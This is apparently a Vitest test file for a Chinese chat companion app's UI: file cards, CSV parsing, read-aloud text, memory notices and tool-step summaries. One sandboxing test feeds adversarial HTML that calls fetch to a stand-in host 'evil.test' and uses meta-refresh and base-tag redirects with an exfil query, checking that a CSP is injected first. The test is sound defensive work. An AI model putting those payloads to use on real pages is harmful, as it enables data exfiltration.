import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { ChatThread } from "@/companion/ChatThread";
import { FileCard } from "@/companion/FileCard";
import { speakAloud } from "@/companion/MessageActions";
import {
  csvRows,
  fileBadge,
  fileDraft,
  fileKind,
  filePageDocument,
  fileTitle,
  rememberedNotes,
  spokenText,
} from "@/companion/fileKinds";
import { chatItems } from "@/companion/presentation";
import type { ToolProgressEvent, UIMessage } from "@/lib/types";

afterEach(() => {
  cleanup();
  vi.useRealTimers();
  vi.unstubAllGlobals();
});

describe("files in the chat", () => {
  it("knows what a file is from its name", () => {
    expect(fileKind("报告.PDF")).toBe("pdf");
    expect(fileKind("阳明山周日徒步计划.md")).toBe("markdown");
    expect(fileKind("预算.xlsx")).toBe("sheet");
    expect(fileKind("鹈狐骑车.html")).toBe("web");
    expect(fileKind("没有后缀")).toBe("other");
    expect(fileBadge("预算.xlsx")).toBe("XLSX");
    expect(fileBadge("没有后缀")).toBe("FILE");
    expect(fileTitle("阳明山周日徒步计划.md")).toBe("阳明山周日徒步计划");
  });

  it("reads a table's first rows, quotes and all", () => {
    expect(csvRows('名字,价格\r\n"苹果, 红",5\n"他说""好""",3\n只有一格\n')).toEqual([
      ["名字", "价格"],
      ["苹果, 红", "5"],
      ['他说"好"', "3"],
      ["只有一格", ""],
    ]);
    expect(csvRows("a\tb\tc", "\t", 10, 2)).toEqual([["a", "b"]]);
  });

  it("keeps a page file offline: its policy goes into its own head before any script", () => {
    const page = filePageDocument("<!doctype html><html><head><title>骑车</title></head><body></body></html>");
    expect(page).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
    expect(page).toContain("connect-src 'none'");
    expect(filePageDocument("<p>片段</p>")).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);

    // Adversarial HTML attempting to trick regex injection via JS strings, comments, or pre-head scripts.
    const inJsString = filePageDocument('<script>fetch("https://evil.test"); var s = "<head>";</script>');
    expect(inJsString.indexOf('http-equiv="Content-Security-Policy"')).toBeGreaterThan(0);
    expect(inJsString.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(inJsString.indexOf("<script>"));

    const preHeadScript = filePageDocument('<!doctype html><script>fetch("https://evil.test")</script><head><title>x</title></head>');
    expect(preHeadScript.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(preHeadScript.indexOf("<script>"));

    const commentedHead = filePageDocument('<html><body><!-- <head> --><script>fetch("https://evil.test")</script></body></html>');
    expect(commentedHead).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
    expect(commentedHead.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(commentedHead.indexOf("<!--"));

    const metaRefreshAndBase = filePageDocument(
      '<html><head><base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/?exfil=1"></head><body>ok</body></html>',
    );
    expect(metaRefreshAndBase).not.toMatch(/http-equiv=["']?refresh/i);
    expect(metaRefreshAndBase).not.toMatch(/<base\b/i);
    expect(metaRefreshAndBase).toContain('http-equiv="Content-Security-Policy"');
  });

  it("shows a Markdown file's first page and its size, and opens it on a tap", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response("# 阳明山\n\n- 早上 7:30 出发\n- 带 1.5 升水")));
    const onOpen = vi.fn((event: { preventDefault: () => void }) => event.preventDefault());
    render(<FileCard item={{ kind: "file", url: "/api/media/a/b", name: "周末徒步计划.md" }} onOpen={onOpen} />);
    expect(screen.getByText("周末徒步计划")).toBeInTheDocument();
    await waitFor(() => expect(screen.getByText(/早上 7:30 出发/)).toBeInTheDocument());
    expect(screen.getByText(/文档 · \d+(\.\d)? B/)).toBeInTheDocument();
    fireEvent.click(screen.getByRole("link", { name: "打开文档「周末徒步计划」" }));
    expect(onOpen).toHaveBeenCalled();
  });

  it("shows a file it can't draw as its row alone", () => {
    const fetcher = vi.fn();
    vi.stubGlobal("fetch", fetcher);
    render(<FileCard item={{ kind: "file", url: "/api/media/a/c", name: "照片.zip" }} onOpen={vi.fn()} />);
    expect(screen.getByText("照片")).toBeInTheDocument();
    expect(screen.getByText("压缩包")).toBeInTheDocument();
    expect(fetcher).not.toHaveBeenCalled();
  });
});

describe("a reply's words, read out", () => {
  it("leaves out cards, link addresses, code and Markdown marks", () => {
    const reply = "## 结论\n**谷歌**这周跌了 12.6%，详见[财报解读](https://example.com/a)。\n\n| 日期 | 涨跌 |\n|---|---|\n| 10/29 | -11.7% |\n\n```python\nprint(1)\n```\n\n```card\n{\"type\":\"buttons\",\"items\":[\"好\"]}\n```";
    expect(spokenText(reply)).toBe("结论\n谷歌这周跌了 12.6%，详见财报解读。\n日期 ， 涨跌\n10/29 ， -11.7%\n（代码略）");
  });

  it("reads with the Android app's own voice there (its WebView has none), and stops on a second tap", () => {
    const speak = vi.fn();
    const stopSpeaking = vi.fn();
    let speaking = false;
    vi.stubGlobal("PersonalBotAndroid", { changeServer: vi.fn(), speak, stopSpeaking, speaking: () => speaking });
    speakAloud("**好**，去西湖吧");
    expect(speak).toHaveBeenCalledWith("好，去西湖吧", "zh-CN");
    speaking = true;
    speakAloud("**好**，去西湖吧");
    expect(stopSpeaking).toHaveBeenCalled();
    expect(speak).toHaveBeenCalledTimes(1);
  });
});

const memory = (args: Record<string, unknown>, extra: Partial<ToolProgressEvent> = {}): ToolProgressEvent => ({
  name: "memory", phase: "end", arguments: args, result: '{"success": true}', ...extra,
});

describe("what it saved about the user", () => {
  it("reads the facts it added or changed about the user", () => {
    expect(rememberedNotes(memory({ target: "user", action: "add", content: "【饮食】不吃香菜；不太能吃辣。" }))).toEqual(["不吃香菜；不太能吃辣。"]);
    expect(rememberedNotes(memory({ target: "user", operations: [
      { action: "patch", old_text: "住上海", content: "住在上海徐汇" },
      { action: "remove", old_text: "在追美股" },
    ] }))).toEqual(["住在上海徐汇"]);
    expect(rememberedNotes(memory({ target: "memory", action: "add", content: "抖音要扫码" }))).toEqual([]);
    expect(rememberedNotes(memory({ target: "user", action: "add", content: "x" }, { phase: "start" }))).toEqual([]);
    expect(rememberedNotes(memory({ target: "user", action: "add", content: "x" }, { result: '{"success": false}' }))).toEqual([]);
  });

  it("shows 已记住 after that turn's reply", () => {
    const messages: UIMessage[] = [
      { id: "u", role: "user", content: "记住：我不吃香菜", turnId: "t1", createdAt: 1 },
      { id: "w", role: "assistant", content: "", kind: "trace", turnId: "t1", createdAt: 2,
        toolEvents: [memory({ target: "user", action: "add", content: "【饮食】不吃香菜" })] },
      { id: "a", role: "assistant", content: "记住了，以后都避开。", turnId: "t1", createdAt: 3 },
      { id: "u2", role: "user", content: "谢谢", turnId: "t2", createdAt: 4 },
    ];
    const items = chatItems(messages, 5);
    const kinds = items.filter((item) => item.type !== "day").map((item) => (item.type === "notice" ? item.text : item.type));
    expect(kinds).toEqual(["user", "reply", "✓ 已记住：不吃香菜", "user"]);
  });
});

describe("long-press on a reply", () => {
  const messages: UIMessage[] = [
    { id: "u", role: "user", content: "周六去哪玩", turnId: "t1", createdAt: 1 },
    { id: "a", role: "assistant", content: "去西湖骑车吧", turnId: "t1", createdAt: 2 },
  ];

  function hold(text: string) {
    fireEvent.pointerDown(screen.getByText(text), { button: 0, clientX: 10, clientY: 10 });
    act(() => vi.advanceTimersByTime(500));
  }

  it("offers 朗读 and, on the newest answer, 重新生成", () => {
    vi.useFakeTimers();
    const onAction = vi.fn();
    render(<ChatThread items={chatItems(messages, 3)} typing={false} routes={new Map()} onDecide={vi.fn()} onMessageAction={onAction} />);
    hold("去西湖骑车吧");
    expect(screen.getByRole("menuitem", { name: /朗读/ })).toBeInTheDocument();
    fireEvent.click(screen.getByRole("menuitem", { name: /重新生成/ }));
    expect(onAction).toHaveBeenCalledWith("regenerate", expect.objectContaining({ id: "a" }), "reply");
  });

  it("does not offer 重新生成 while it works, or on an older answer", () => {
    vi.useFakeTimers();
    render(<ChatThread items={chatItems(messages, 3)} typing routes={new Map()} onDecide={vi.fn()} onMessageAction={vi.fn()} />);
    hold("去西湖骑车吧");
    expect(screen.queryByRole("menuitem", { name: /重新生成/ })).not.toBeInTheDocument();
    cleanup();
    const later: UIMessage[] = [...messages, { id: "u2", role: "user", content: "好", turnId: "t2", createdAt: 3 }];
    render(<ChatThread items={chatItems(later, 4)} typing={false} routes={new Map()} onDecide={vi.fn()} onMessageAction={vi.fn()} />);
    hold("去西湖骑车吧");
    expect(screen.getByRole("menuitem", { name: /朗读/ })).toBeInTheDocument();
    expect(screen.queryByRole("menuitem", { name: /重新生成/ })).not.toBeInTheDocument();
  });
});

describe("what a turn did", () => {
  const messages: UIMessage[] = [
    { id: "u", role: "user", content: "查周六去杭州的高铁", turnId: "t1", createdAt: 1_000 },
    { id: "w", role: "assistant", content: "", kind: "trace", turnId: "t1", createdAt: 2_000,
      toolEvents: [
        { call_id: "a", name: "web_search", phase: "start", arguments: { query: "上海 杭州 高铁" } },
        { call_id: "a", name: "web_search", phase: "end", arguments: { query: "上海 杭州 高铁" } },
        { call_id: "b", name: "web_fetch", phase: "end", arguments: { url: "https://www.12306.cn/" }, error: "超时" },
      ] },
    { id: "a", role: "assistant", content: "找到 3 班。", turnId: "t1", createdAt: 73_000 },
  ];

  it("shows how many steps and how long under the turn's reply, and lists them on a tap", () => {
    render(<ChatThread items={chatItems(messages, 80_000)} typing={false} routes={new Map()} onDecide={vi.fn()} />);
    const chip = screen.getByRole("button", { name: /做了 2 步 · 用时 1 分 12 秒 · 有一步出错/ });
    fireEvent.click(chip);
    expect(chip).toHaveAttribute("aria-expanded", "true");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(screen.getByText(/（出错了）/)).toBeInTheDocument();
  });

  it("waits until the turn is over", () => {
    render(<ChatThread items={chatItems(messages, 80_000)} typing routes={new Map()} onDecide={vi.fn()} />);
    expect(screen.queryByRole("button", { name: /做了 2 步/ })).not.toBeInTheDocument();
  });
});

describe("a document while it is written", () => {
  const write = (id: string, path: string, content: string, phase = "end") => ({ call_id: id, name: "write_file", phase, arguments: { path, content } });
  const asked: UIMessage = { id: "u", role: "user", content: "做个周末计划", turnId: "t1", createdAt: 1 };

  it("shows the newest document of the turn at work until the file itself is sent", () => {
    const scripts: UIMessage = { id: "s", role: "assistant", content: "", kind: "trace", turnId: "t1", createdAt: 2,
      toolEvents: [write("s", "/tmp/fetch.py", "print(1)"), write("h", "/home/me/.hermes/notes.md", "私人笔记")] };
    const plan: UIMessage = { id: "p", role: "assistant", content: "", kind: "trace", turnId: "t1", createdAt: 3,
      toolEvents: [write("p", "E:\\creations\\周末计划.md", "# 周末\n- 爬山", "start")] };
    expect(fileDraft([asked, scripts])).toBeNull();
    expect(fileDraft([asked, scripts, plan])).toMatchObject({ name: "周末计划.md", done: false });
    const sent: UIMessage = { id: "a", role: "assistant", content: "写好了", turnId: "t1", createdAt: 4,
      media: [{ kind: "file", url: "/api/media/a/b", name: "周末计划.md" }] };
    expect(fileDraft([asked, plan, sent])).toBeNull();
  });

  it("is shown above the working line while it works", () => {
    const draft = { id: "p", name: "周末计划.md", content: "# 周末\n- 爬山", done: true };
    render(<ChatThread items={[]} typing draft={draft} routes={new Map()} onDecide={vi.fn()} />);
    expect(screen.getByRole("status", { name: "已写好「周末计划」" })).toBeInTheDocument();
  });
});
